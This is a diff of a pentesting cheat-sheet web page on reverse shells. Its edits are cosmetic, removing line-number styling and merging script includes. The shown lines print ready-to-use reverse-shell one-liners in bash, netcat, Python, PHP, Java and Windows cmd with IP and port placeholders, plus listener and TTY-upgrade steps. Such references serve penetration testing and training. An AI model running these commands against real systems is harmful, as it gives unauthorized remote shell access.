@@ -19,9 +19,7 @@
     var mkdocs_page_input_path = "reverse-shell.md";
     var mkdocs_page_url = "/reverse-shell/";
   </script>
-  
-  <script src="../js/jquery-2.1.1.min.js" defer></script>
-  <script src="../js/modernizr-2.8.3.min.js" defer></script> 
+   
 </head>
 
 <body class="ready sticky">
@@ -309,7 +307,7 @@ a listener with <code>netcat</code>:</p>
 <h2 id="on-local-machine">On local machine</h2>
 <h3 id="listen-with-netcat">Listen with NetCat</h3>
 <p>To listen for an incoming connection and upgrade to a pty shell:</p>
-<pre><code class="language-bash line-numbers">nc -lvnp {PORT}
+<pre><code class="language-bash">nc -lvnp {PORT}
 
 # after the connection is established
 python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
@@ -323,16 +321,16 @@ instead of the one provided by the OS</p>
 <h3 id="upgrade-the-shell">Upgrade the shell</h3>
 <p>Then, <code>Ctrl-Z</code> to suspend the connection and return to your own terminal.
 Type on your terminal:</p>
-<pre><code class="language-bash line-numbers">stty raw -echo
+<pre><code class="language-bash">stty raw -echo
 </code></pre>
 
 <p>The console should be black, next foreground the shell with:</p>
-<pre><code class="language-bash line-numbers">fg
+<pre><code class="language-bash">fg
 reset
 </code></pre>
 
 <p>On target host:</p>
-<pre><code class="language-bash line-numbers">export SHELL=bash
+<pre><code class="language-bash">export SHELL=bash
 export TERM=xterm-256color
 stty rows 24 columns 80
 </code></pre>
@@ -342,17 +340,17 @@ stty rows 24 columns 80
 <h3 id="windows">Windows</h3>
 <p>Upload <a href="https://eternallybored.org/misc/netcat/" target="_blank"><code>nc.exe</code></a> on the remote server
 then use the command (same as <a href="#netcat">NetCat</a>):</p>
-<pre><code class="language-bash line-numbers">cmd.exe /C &quot;nc.exe {IP} {PORT} -e cmd.exe&quot;
+<pre><code class="language-bash">cmd.exe /C &quot;nc.exe {IP} {PORT} -e cmd.exe&quot;
 </code></pre>
 
 <h3 id="powershell">PowerShell</h3>
 <p>This is explain in the <a href="../windows/#download-and-execute-script">Windows / Download and execute script section</a>.</p>
 <h3 id="python">Python</h3>
-<pre><code class="language-bash line-numbers">python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;{IP}&quot;,{PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'
+<pre><code class="language-bash">python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;{IP}&quot;,{PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'
 </code></pre>
 
 <h3 id="bash">Bash</h3>
-<pre><code class="language-bash line-numbers">bash -i &gt;&amp; /dev/tcp/{IP}/{PORT} 0&gt;&amp;1
+<pre><code class="language-bash">bash -i &gt;&amp; /dev/tcp/{IP}/{PORT} 0&gt;&amp;1
 </code></pre>
 
 <blockquote>
@@ -361,11 +359,11 @@ as shell. Often it uses <code>sh</code> or <code>dash</code>, then you can use <
 force the <code>bash</code></p>
 </blockquote>
 <h3 id="netcat">Netcat</h3>
-<pre><code class="language-bash line-numbers">nc -e /bin/sh {IP} {PORT}
+<pre><code class="language-bash">nc -e /bin/sh {IP} {PORT}
 </code></pre>
 
 <h3 id="java">Java</h3>
-<pre><code class="language-java line-numbers">r = Runtime.getRuntime();p = r.exec([&quot;your payload&quot;] as String[]);p.waitFor()
+<pre><code class="language-java">r = Runtime.getRuntime();p = r.exec([&quot;your payload&quot;] as String[]);p.waitFor()
 String[] cmd={&quot;cmd&quot;,&quot;/C&quot;,&quot;&lt;cmd&gt;&quot;};Runtime.getRuntime().exec(cmd);
 </code></pre>
 
@@ -373,7 +371,7 @@ String[] cmd={&quot;cmd&quot;,&quot;/C&quot;,&quot;&lt;cmd&gt;&quot;};Runtime.ge
 <p>This payload can also work with <code>BeanShell</code> scripts.</p>
 </blockquote>
 <h3 id="php">PHP</h3>
-<pre><code class="language-bash line-numbers">php -r '\$sock=fsockopen(\&quot;{IP}\&quot;,{PORT});exec(\&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\&quot;);'
+<pre><code class="language-bash">php -r '\$sock=fsockopen(\&quot;{IP}\&quot;,{PORT});exec(\&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\&quot;);'
 </code></pre>
 
 <h2 id="forward-shell">Forward shell</h2>
@@ -411,18 +409,8 @@ technique on other services that allow you to inject commands.</p>
     </span>
 </div>
     <script>var base_url = '..';</script>
-    <script src="../js/theme.js"></script>
-    <script src="../js/prism-core.min.js"></script>
-    <script src="../js/prism-line-numbers.min.js"></script>
-    <script src="../js/prism-clike.min.js"></script>
-    <script src="../js/prism-yaml.min.js"></script>
-    <script src="../js/prism-powershell.min.js"></script>
-    <script src="../js/prism-bash.min.js"></script>
-    <script src="../js/prism-nginx.min.js"></script>
-    <script src="../js/prism-python.min.js"></script>
-    <script src="../js/prism-markup.min.js"></script>
-    <script src="../js/prism-markup-templating.min.js"></script>
-    <script src="../js/prism-php.min.js"></script>
+    <script async src="../js/theme.js"></script>
+    <script async src="../js/prism.min.js"></script>
     <script src="../search/main.js"></script>
     
     <script>
